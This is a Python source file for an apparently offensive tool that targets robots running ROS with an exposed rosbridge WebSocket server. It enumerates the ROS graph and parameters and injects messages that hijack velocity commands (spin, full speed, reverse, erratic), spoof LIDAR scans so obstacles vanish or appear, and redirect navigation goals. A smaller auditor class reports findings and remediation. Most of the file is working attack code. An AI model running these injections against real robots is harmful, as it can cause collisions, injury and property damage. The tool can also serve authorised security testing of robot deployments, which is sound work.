#!/usr/bin/env python3
"""
rosbridge.py — ROSBridge WebSocket Enumeration & Injection
===========================================================
Targets ROS deployments exposing the rosbridge_suite WebSocket server
(default port 9090). No ROS installation required — uses stdlib sockets
with a hand-rolled WebSocket framing layer (RFC 6455).

Attack surface:
  rosbridge exposes the full ROS pub/sub/service/param API over an
  unauthenticated WebSocket connection. Any host on the network can
  enumerate every topic, node, service and parameter, and publish to
  any topic without credentials.

Capabilities:
  Enumeration  — topics (with types), nodes, services, parameters
  Injection    — cmd_vel hijack, LIDAR blinding, nav goal spoofing
  Audit        — unauthenticated access, dangerous topics, version info

Wire protocol:
  rosbridge uses JSON messages over WebSocket:
    {"op": "publish",      "topic": "/cmd_vel", "msg": {...}}
    {"op": "call_service", "service": "/rosapi/topics"}
    {"op": "subscribe",    "topic": "/...", "type": "..."}
    {"op": "advertise",    "topic": "/...", "type": "..."}
    {"op": "unadvertise",  "topic": "/..."}

  rosapi services available when rosapi node is running:
    /rosapi/topics, /rosapi/nodes, /rosapi/services,
    /rosapi/get_param, /rosapi/set_param, /rosapi/get_param_names,
    /rosapi/topics_and_raw_types, /rosapi/service_type,
    /rosapi/message_details

Compatible with: ROS 1 + ROS 2 rosbridge deployments (Galactic, Humble, etc.)

Author: Gh057x
"""

import base64
import hashlib
import json
import math
import os
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from modules.sros2_audit import AuditFinding, AuditReport, Severity


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DEFAULT_RB_PORT = 9090
WS_MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

# Security-critical topics — matches ros1_audit.py list plus ROS2 equivalents
DANGEROUS_TOPICS = [
    "/cmd_vel", "/cmd_vel_unstamped",
    "/mobile_base/commands/velocity",
    "/cmd_vel_mux/input/teleop",
    "/move_base/goal", "/move_base_simple/goal",
    "/initialpose",
    "/scan", "/scan_raw",
    "/joy", "/joy/set_feedback",
    "/e_stop", "/emergency_stop",
    "/arm/command", "/gripper/command",
]

# CMD_VEL presets — mirrors ros1_injection.py
CMD_VEL_PRESETS: Dict[str, Dict[str, float]] = {
    "spin":      {"lx": 0.0,  "az": 3.14},
    "spinout":   {"lx": 0.5,  "az": 3.14},
    "fullspeed": {"lx": 2.0,  "az": 0.0},
    "reverse":   {"lx": -2.0, "az": 0.0},
    "estop":     {"lx": 0.0,  "az": 0.0},
    "erratic":   {"lx": 1.0,  "az": 2.0},
    "circle":    {"lx": 0.3,  "az": 0.8},
}


# ---------------------------------------------------------------------------
# Minimal stdlib WebSocket client (RFC 6455)
# ---------------------------------------------------------------------------

class WebSocketError(Exception):
    pass


class _WSClient:
    """
    Minimal synchronous WebSocket client — no third-party dependencies.

    Implements just enough of RFC 6455 to speak the rosbridge JSON protocol:
      - TCP connection + HTTP Upgrade handshake
      - Sending masked text frames (client->server MUST be masked per spec)
      - Receiving unmasked text frames from server
      - Responding to server ping frames with pong
      - Clean close handshake
    """

    def __init__(self, host: str, port: int = DEFAULT_RB_PORT,
                 path: str = "/", timeout: float = 10.0):
        self.host = host
        self.port = port
        self.path = path
        self.timeout = timeout
        self._sock: Optional[socket.socket] = None
        self._connected = False

    # ------------------------------------------------------------------
    # Connection lifecycle
    # ------------------------------------------------------------------

    def connect(self):
        """Perform TCP connect + WebSocket HTTP Upgrade handshake."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.settimeout(self.timeout)
        try:
            self._sock.connect((self.host, self.port))
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            raise WebSocketError(f"TCP connect failed to {self.host}:{self.port}: {e}")

        # Generate random 16-byte nonce as base64
        nonce = base64.b64encode(os.urandom(16)).decode()
        expected_accept = base64.b64encode(
            hashlib.sha1((nonce + WS_MAGIC).encode()).digest()
        ).decode()

        handshake = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {nonce}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        )
        self._sock.sendall(handshake.encode())

        # Read HTTP response headers
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = self._sock.recv(4096)
            if not chunk:
                raise WebSocketError("Connection closed during handshake")
            response += chunk
            if len(response) > 8192:
                raise WebSocketError("Handshake response too large")

        first_line = response.split(b"\r\n")[0].decode()
        if "101" not in first_line:
            raise WebSocketError(f"WebSocket upgrade failed: {first_line}")

        # Verify Sec-WebSocket-Accept
        if expected_accept.encode() not in response:
            raise WebSocketError("Sec-WebSocket-Accept mismatch — not a valid WebSocket server")

        self._connected = True

    def close(self):
        """Send close frame and shut down socket."""
        if self._sock and self._connected:
            try:
                self._send_frame(b"", opcode=0x8)  # close frame
            except Exception:
                pass
            self._sock.close()
        self._connected = False

    # ------------------------------------------------------------------
    # Frame I/O
    # ------------------------------------------------------------------

    def send(self, data: str):
        """Send a masked text frame."""
        self._send_frame(data.encode("utf-8"), opcode=0x1)

    def send_json(self, obj: Any):
        """Serialize obj to JSON and send as text frame."""
        self.send(json.dumps(obj))

    def recv(self, timeout: Optional[float] = None) -> Optional[str]:
        """
        Receive the next text frame. Returns None on close or timeout.
        Automatically responds to server ping frames.
        """
        old_timeout = self._sock.gettimeout()
        if timeout is not None:
            self._sock.settimeout(timeout)
        try:
            return self._recv_frame()
        except socket.timeout:
            return None
        finally:
            self._sock.settimeout(old_timeout)

    def recv_json(self, timeout: Optional[float] = None) -> Optional[Dict]:
        """Receive a text frame and JSON-parse it."""
        raw = self.recv(timeout=timeout)
        if raw is None:
            return None
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return None

    # ------------------------------------------------------------------
    # Internal framing
    # ------------------------------------------------------------------

    def _send_frame(self, payload: bytes, opcode: int = 0x1):
        """Build and send a single WebSocket frame (client->server, masked)."""
        mask_key = os.urandom(4)
        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))

        length = len(payload)
        if length <= 125:
            header = bytes([0x80 | opcode, 0x80 | length])
        elif length <= 65535:
            header = bytes([0x80 | opcode, 0x80 | 126]) + struct.pack("!H", length)
        else:
            header = bytes([0x80 | opcode, 0x80 | 127]) + struct.pack("!Q", length)

        self._sock.sendall(header + mask_key + masked)

    def _send_pong(self, payload: bytes):
        self._send_frame(payload, opcode=0xA)

    def _recvn(self, n: int) -> bytes:
        """Read exactly n bytes from the socket."""
        buf = b""
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))
            if not chunk:
                raise WebSocketError("Connection closed mid-frame")
            buf += chunk
        return buf

    def _recv_frame(self) -> Optional[str]:
        """Read one complete WebSocket frame from the server."""
        header = self._recvn(2)
        b0, b1 = header[0], header[1]

        opcode = b0 & 0x0F
        is_masked = (b1 & 0x80) != 0
        payload_len = b1 & 0x7F

        if payload_len == 126:
            payload_len = struct.unpack("!H", self._recvn(2))[0]
        elif payload_len == 127:
            payload_len = struct.unpack("!Q", self._recvn(8))[0]

        mask = self._recvn(4) if is_masked else None
        payload = self._recvn(payload_len)

        if mask:
            payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))

        if opcode == 0x8:   # close
            return None
        if opcode == 0x9:   # ping — respond with pong and recurse
            self._send_pong(payload)
            return self._recv_frame()
        if opcode in (0x1, 0x0):  # text or continuation
            return payload.decode("utf-8", errors="replace")

        # Ignore binary, pong, reserved opcodes — try next frame
        return self._recv_frame()


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class RosbridgeTopicInfo:
    name: str
    msg_type: str = ""
    has_publishers: bool = False
    has_subscribers: bool = False

    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "type": self.msg_type,
            "has_publishers": self.has_publishers,
            "has_subscribers": self.has_subscribers,
        }


@dataclass
class RosbridgeEnumResult:
    host: str
    port: int
    rosbridge_version: str = "unknown"
    ros_version: str = "unknown"
    topics: List[RosbridgeTopicInfo] = field(default_factory=list)
    nodes: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    params: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    errors: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "host": self.host,
            "port": self.port,
            "rosbridge_version": self.rosbridge_version,
            "ros_version": self.ros_version,
            "topics": [t.to_dict() for t in self.topics],
            "nodes": self.nodes,
            "services": self.services,
            "params": self.params,
            "timestamp": self.timestamp,
            "errors": self.errors,
        }


@dataclass
class RosbridgeInjectionResult:
    attack_type: str
    topic: str
    target: str
    start_time: str
    end_time: str = ""
    messages_sent: int = 0
    success: bool = False
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "attack_type": self.attack_type,
            "topic": self.topic,
            "target": self.target,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "messages_sent": self.messages_sent,
            "success": self.success,
            "notes": self.notes,
        }


# ---------------------------------------------------------------------------
# Enumeration
# ---------------------------------------------------------------------------

class RosbridgeEnumerator:
    """
    Enumerate the full ROS compute graph via rosbridge WebSocket.

    Calls rosapi services to retrieve:
      - Topics and their message types
      - Active nodes
      - Available services
      - Parameter server keys
    """

    def __init__(self, port: int = DEFAULT_RB_PORT, timeout: float = 10.0,
                 verbose: bool = False):
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self._result: Optional[RosbridgeEnumResult] = None

    def _log(self, msg: str):
        if self.verbose:
            print(f"[*] {msg}")

    def _call_service(self, ws: _WSClient, service: str,
                      args: Optional[Dict] = None,
                      call_id: str = "enum_1") -> Optional[Dict]:
        """Call a rosapi service and return the parsed response."""
        req: Dict[str, Any] = {
            "op": "call_service",
            "id": call_id,
            "service": service,
        }
        if args:
            req["args"] = args
        ws.send_json(req)

        deadline = time.monotonic() + self.timeout
        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            msg = ws.recv_json(timeout=min(remaining, 2.0))
            if msg is None:
                continue
            if msg.get("op") == "service_response" and msg.get("id") == call_id:
                return msg
        return None

    def enumerate(self, host: str) -> RosbridgeEnumResult:
        result = RosbridgeEnumResult(host=host, port=self.port)
        ws = _WSClient(host, self.port, timeout=self.timeout)

        try:
            ws.connect()
            self._log(f"Connected to rosbridge at {host}:{self.port}")
        except WebSocketError as e:
            result.errors.append(str(e))
            return result

        try:
            # --- Topics ---
            self._log("Querying /rosapi/topics_and_raw_types ...")
            resp = self._call_service(ws, "/rosapi/topics_and_raw_types",
                                      call_id="topics_types")
            if resp and resp.get("result") and resp.get("values"):
                vals = resp["values"]
                names = vals.get("topics", [])
                types = vals.get("types", [])
                for i, name in enumerate(names):
                    t = types[i] if i < len(types) else ""
                    result.topics.append(RosbridgeTopicInfo(name=name, msg_type=t))
                self._log(f"Found {len(result.topics)} topics")
            else:
                # Fallback: /rosapi/topics (no types)
                self._log("Falling back to /rosapi/topics ...")
                resp = self._call_service(ws, "/rosapi/topics", call_id="topics_only")
                if resp and resp.get("values"):
                    for name in resp["values"].get("topics", []):
                        result.topics.append(RosbridgeTopicInfo(name=name))

            # --- Nodes ---
            self._log("Querying /rosapi/nodes ...")
            resp = self._call_service(ws, "/rosapi/nodes", call_id="nodes")
            if resp and resp.get("values"):
                result.nodes = resp["values"].get("nodes", [])
                self._log(f"Found {len(result.nodes)} nodes")

            # --- Services ---
            self._log("Querying /rosapi/services ...")
            resp = self._call_service(ws, "/rosapi/services", call_id="services")
            if resp and resp.get("values"):
                result.services = resp["values"].get("services", [])
                self._log(f"Found {len(result.services)} services")

            # --- Parameters ---
            self._log("Querying /rosapi/get_param_names ...")
            resp = self._call_service(ws, "/rosapi/get_param_names",
                                      call_id="params")
            if resp and resp.get("values"):
                result.params = resp["values"].get("names", [])
                self._log(f"Found {len(result.params)} parameters")

            # --- rosbridge version probe ---
            resp = self._call_service(ws, "/rosapi/get_param",
                                      args={"name": "/rosbridge_websocket/port"},
                                      call_id="rb_version")
            # Version typically comes through in service error text or node name
            for node in result.nodes:
                if "rosbridge" in node:
                    result.rosbridge_version = "detected"
                    break

        except WebSocketError as e:
            result.errors.append(f"Enumeration error: {e}")
        finally:
            ws.close()

        self._result = result
        return result

    def export_results(self, path: str):
        if self._result:
            with open(path, "w") as f:
                json.dump(self._result.to_dict(), f, indent=2, default=str)
            print(f"[*] Enumeration results saved to {path}")


# ---------------------------------------------------------------------------
# Injection
# ---------------------------------------------------------------------------

class RosbridgeInjector:
    """
    Publish arbitrary ROS messages via rosbridge WebSocket.

    No ROS installation required. Supports any ROS 1 or ROS 2 deployment
    with rosbridge_suite running.

    Injection flow:
      1. WebSocket connect
      2. Advertise as publisher on the target topic (optional but cleaner)
      3. Publish messages at the specified rate for the specified duration
      4. Unadvertise and close
    """

    def __init__(self, host: str, port: int = DEFAULT_RB_PORT,
                 timeout: float = 10.0, verbose: bool = False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self._results: List[RosbridgeInjectionResult] = []

    def _log(self, msg: str):
        if self.verbose:
            print(f"[*] {msg}")

    def _target(self) -> str:
        return f"{self.host}:{self.port}"

    # ------------------------------------------------------------------
    # cmd_vel injection
    # ------------------------------------------------------------------

    def inject_cmd_vel(
        self,
        topic: str = "/cmd_vel",
        preset: str = "spin",
        linear_x: Optional[float] = None,
        angular_z: Optional[float] = None,
        duration: float = 10.0,
        rate_hz: float = 10.0,
    ):
        """
        Publish geometry_msgs/Twist messages to hijack robot motion.

        Preset values match ros1_injection.py for consistency.
        """
        params = CMD_VEL_PRESETS.get(preset, CMD_VEL_PRESETS["spin"])
        lx = linear_x if linear_x is not None else params["lx"]
        az = angular_z if angular_z is not None else params["az"]

        msg = {
            "linear":  {"x": lx,  "y": 0.0, "z": 0.0},
            "angular": {"x": 0.0, "y": 0.0, "z": az},
        }

        result = RosbridgeInjectionResult(
            attack_type=f"cmd_vel:{preset}",
            topic=topic,
            target=self._target(),
            start_time=datetime.now().isoformat(),
        )

        print(f"[*] Injecting {topic} — preset={preset} lx={lx:.2f} az={az:.2f} "
              f"for {duration}s @ {rate_hz}Hz")

        self._run_injection(topic, "geometry_msgs/Twist", msg,
                            duration, rate_hz, result)
        self._results.append(result)
        return result

    # ------------------------------------------------------------------
    # LIDAR injection
    # ------------------------------------------------------------------

    def inject_lidar(
        self,
        topic: str = "/scan",
        mode: str = "allclear",
        duration: float = 10.0,
        rate_hz: float = 10.0,
        num_ranges: int = 360,
    ):
        """
        Publish spoofed sensor_msgs/LaserScan messages.

        Modes:
          allclear — all ranges at max (30m) — robot thinks path is clear
          wall     — all ranges at min (0.2m) — robot thinks it's surrounded
          phantom  — clear everywhere except a phantom obstacle dead-ahead
        """
        range_max = 30.0
        range_min = 0.15

        if mode == "allclear":
            ranges = [range_max] * num_ranges
        elif mode == "wall":
            ranges = [range_min + 0.05] * num_ranges
        elif mode == "phantom":
            ranges = [range_max] * num_ranges
            # Place obstacle in forward-facing sector (indices around 0/360)
            for i in list(range(0, 10)) + list(range(num_ranges - 10, num_ranges)):
                ranges[i] = range_min + 0.1
        else:
            ranges = [range_max] * num_ranges

        angle_inc = (2 * math.pi) / num_ranges
        msg = {
            "header": {
                "seq": 0,
                "stamp": {"secs": int(time.time()), "nsecs": 0},
                "frame_id": "laser",
            },
            "angle_min":       -math.pi,
            "angle_max":        math.pi,
            "angle_increment":  angle_inc,
            "time_increment":   0.0,
            "scan_time":        1.0 / rate_hz,
            "range_min":        range_min,
            "range_max":        range_max,
            "ranges":           ranges,
            "intensities":      [],
        }

        result = RosbridgeInjectionResult(
            attack_type=f"lidar:{mode}",
            topic=topic,
            target=self._target(),
            start_time=datetime.now().isoformat(),
        )

        print(f"[*] Injecting {topic} — mode={mode} ranges={num_ranges} "
              f"for {duration}s @ {rate_hz}Hz")

        self._run_injection(topic, "sensor_msgs/LaserScan", msg,
                            duration, rate_hz, result)
        self._results.append(result)
        return result

    # ------------------------------------------------------------------
    # Nav goal injection
    # ------------------------------------------------------------------

    def inject_nav_goal(
        self,
        topic: str = "/move_base_simple/goal",
        x: float = 0.0,
        y: float = 0.0,
        duration: float = 5.0,
        rate_hz: float = 1.0,
    ):
        """
        Publish a geometry_msgs/PoseStamped nav goal to redirect navigation.
        """
        msg = {
            "header": {
                "seq": 0,
                "stamp": {"secs": int(time.time()), "nsecs": 0},
                "frame_id": "map",
            },
            "pose": {
                "position":    {"x": x, "y": y, "z": 0.0},
                "orientation": {"x": 0.0, "y": 0.0, "z": 0.0, "w": 1.0},
            },
        }

        result = RosbridgeInjectionResult(
            attack_type=f"nav_goal:({x},{y})",
            topic=topic,
            target=self._target(),
            start_time=datetime.now().isoformat(),
        )

        print(f"[*] Injecting nav goal ({x}, {y}) on {topic} "
              f"for {duration}s @ {rate_hz}Hz")

        self._run_injection(topic, "geometry_msgs/PoseStamped", msg,
                            duration, rate_hz, result)
        self._results.append(result)
        return result

    # ------------------------------------------------------------------
    # Internal injection runner
    # ------------------------------------------------------------------

    def _run_injection(
        self,
        topic: str,
        msg_type: str,
        msg: Dict,
        duration: float,
        rate_hz: float,
        result: RosbridgeInjectionResult,
    ):
        ws = _WSClient(self.host, self.port, timeout=self.timeout)
        try:
            ws.connect()
            self._log(f"WebSocket connected to {self.host}:{self.port}")
        except WebSocketError as e:
            print(f"[!] Connection failed: {e}")
            result.notes.append(f"Connection failed: {e}")
            result.end_time = datetime.now().isoformat()
            return

        try:
            # Advertise as publisher
            ws.send_json({"op": "advertise", "topic": topic, "type": msg_type})
            self._log(f"Advertised on {topic} as {msg_type}")

            interval = 1.0 / rate_hz
            deadline = time.monotonic() + duration
            sent = 0

            while time.monotonic() < deadline:
                ws.send_json({"op": "publish", "topic": topic, "msg": msg})
                sent += 1
                if self.verbose and sent % 10 == 0:
                    remaining = deadline - time.monotonic()
                    print(f"[*] {sent} messages sent, {remaining:.1f}s remaining")
                time.sleep(interval)

            result.messages_sent = sent
            result.success = sent > 0
            result.notes.append(f"Published {sent} messages over {duration}s")
            print(f"[+] Done — {sent} messages sent to {topic}")

        except (WebSocketError, OSError) as e:
            result.notes.append(f"Injection error: {e}")
            print(f"[!] Injection error: {e}")
        except KeyboardInterrupt:
            result.notes.append("Interrupted by user")
            print("\n[!] Interrupted")
        finally:
            try:
                ws.send_json({"op": "unadvertise", "topic": topic})
            except Exception:
                pass
            ws.close()
            result.end_time = datetime.now().isoformat()

    def export_results(self, path: str):
        with open(path, "w") as f:
            json.dump(
                [r.to_dict() for r in self._results],
                f, indent=2, default=str,
            )
        print(f"[*] Injection results saved to {path}")


# ---------------------------------------------------------------------------
# Auditor
# ---------------------------------------------------------------------------

class RosbridgeAuditor:
    """
    Security audit for rosbridge WebSocket deployments.

    Checks:
      CRITICAL — Unauthenticated WebSocket access confirmed
      HIGH     — Dangerous motion/sensor topics exposed
      HIGH     — Parameter server readable (may expose credentials/config)
      HIGH     — rosapi enumeration service available (full graph exposure)
      MEDIUM   — Unencrypted transport (ws:// not wss://)
      MEDIUM   — No topic type restrictions
      INFO     — rosbridge version, node count, topic count
    """

    def __init__(self, port: int = DEFAULT_RB_PORT, timeout: float = 10.0,
                 verbose: bool = False):
        self.port = port
        self.timeout = timeout
        self.verbose = verbose

    def audit(self, host: str,
              enum_result: Optional[RosbridgeEnumResult] = None) -> AuditReport:
        findings: List[AuditFinding] = []

        # Enumerate if not provided
        if enum_result is None:
            enumerator = RosbridgeEnumerator(
                port=self.port, timeout=self.timeout, verbose=self.verbose
            )
            enum_result = enumerator.enumerate(host)

        target = f"{host}:{self.port}"

        # CRITICAL: unauthenticated access
        if not enum_result.errors or enum_result.topics or enum_result.nodes:
            findings.append(AuditFinding(
                check_id="RB-001",
                severity=Severity.CRITICAL,
                title="Unauthenticated rosbridge WebSocket access",
                description=(
                    f"rosbridge at {target} accepts WebSocket connections without "
                    "authentication. Any host on the network can enumerate and "
                    "publish to every ROS topic."
                ),
                remediation=(
                    "Enable rosbridge authentication (use rosbridge_server with "
                    "authentication:=true and a rosauth backend), restrict access "
                    "with a firewall, or use a VPN/network segment."
                ),
                evidence="rosbridge_websocket",
            ))

        # HIGH: dangerous topics exposed
        exposed_dangerous = [
            t for t in enum_result.topics
            if any(t.name == d or t.name.endswith(d) for d in DANGEROUS_TOPICS)
        ]
        if exposed_dangerous:
            names = ", ".join(t.name for t in exposed_dangerous[:8])
            findings.append(AuditFinding(
                check_id="RB-002",
                severity=Severity.HIGH,
                title=f"Safety-critical topics exposed ({len(exposed_dangerous)} found)",
                description=(
                    f"The following safety-critical topics are accessible via "
                    f"rosbridge without authentication: {names}"
                ),
                remediation=(
                    "Restrict topic access via rosbridge ACL configuration or "
                    "remove rosbridge from production deployments."
                ),
                evidence=names,
            ))

        # HIGH: parameter server accessible
        if enum_result.params:
            findings.append(AuditFinding(
                check_id="RB-003",
                severity=Severity.HIGH,
                title=f"Parameter server readable ({len(enum_result.params)} keys)",
                description=(
                    "The ROS parameter server is fully readable via "
                    "/rosapi/get_param_names and /rosapi/get_param. "
                    "Parameters may contain credentials, API keys, robot config, "
                    "or calibration data."
                ),
                remediation=(
                    "Disable rosapi or restrict /rosapi/get_param via rosbridge "
                    "service ACL. Do not store secrets in the ROS parameter server."
                ),
                evidence="/rosapi/get_param",
            ))

        # HIGH: full graph enumeration via rosapi
        if any(s.startswith("/rosapi/") for s in enum_result.services):
            findings.append(AuditFinding(
                check_id="RB-004",
                severity=Severity.HIGH,
                title="rosapi service exposes full ROS compute graph",
                description=(
                    "/rosapi/* services allow unauthenticated enumeration of all "
                    "nodes, topics, services, and message types — providing an "
                    "attacker with a complete map of the robot's architecture."
                ),
                remediation=(
                    "Disable the rosapi node if not required, or restrict it "
                    "via rosbridge service ACL."
                ),
                evidence="rosapi",
            ))

        # MEDIUM: unencrypted transport
        findings.append(AuditFinding(
            check_id="RB-005",
            severity=Severity.MEDIUM,
            title="rosbridge using unencrypted WebSocket (ws://)",
            description=(
                f"rosbridge at {target} is using plain ws:// without TLS. "
                "Traffic can be intercepted and injected by any host on the "
                "same network segment."
            ),
            remediation=(
                "Configure rosbridge with SSL/TLS (ssl:=true, certfile, keyfile "
                "parameters) and use wss:// only."
            ),
            evidence="rosbridge_websocket transport",
        ))

        # MEDIUM: no rate limiting / topic whitelist evidence
        if len(enum_result.topics) > 10:
            findings.append(AuditFinding(
                check_id="RB-006",
                severity=Severity.MEDIUM,
                title=f"No topic restrictions detected ({len(enum_result.topics)} topics exposed)",
                description=(
                    f"All {len(enum_result.topics)} topics are accessible via "
                    "rosbridge with no apparent ACL or topic whitelist. "
                    "An attacker can subscribe to all sensor data and publish "
                    "to all actuator topics."
                ),
                remediation=(
                    "Configure rosbridge topic ACL or use a topic whitelist "
                    "to restrict which topics are accessible."
                ),
                evidence="rosbridge_websocket / topic ACL",
            ))

        # INFO: deployment summary
        findings.append(AuditFinding(
            check_id="RB-007",
            severity=Severity.INFO,
            title="rosbridge deployment summary",
            description=(
                f"Host: {target} | "
                f"Topics: {len(enum_result.topics)} | "
                f"Nodes: {len(enum_result.nodes)} | "
                f"Services: {len(enum_result.services)} | "
                f"Params: {len(enum_result.params)}"
            ),
            evidence="rosbridge_websocket",
        ))

        report = AuditReport(
            target=target,
            timestamp=datetime.now().isoformat(),
            findings=findings,
        )
        return report
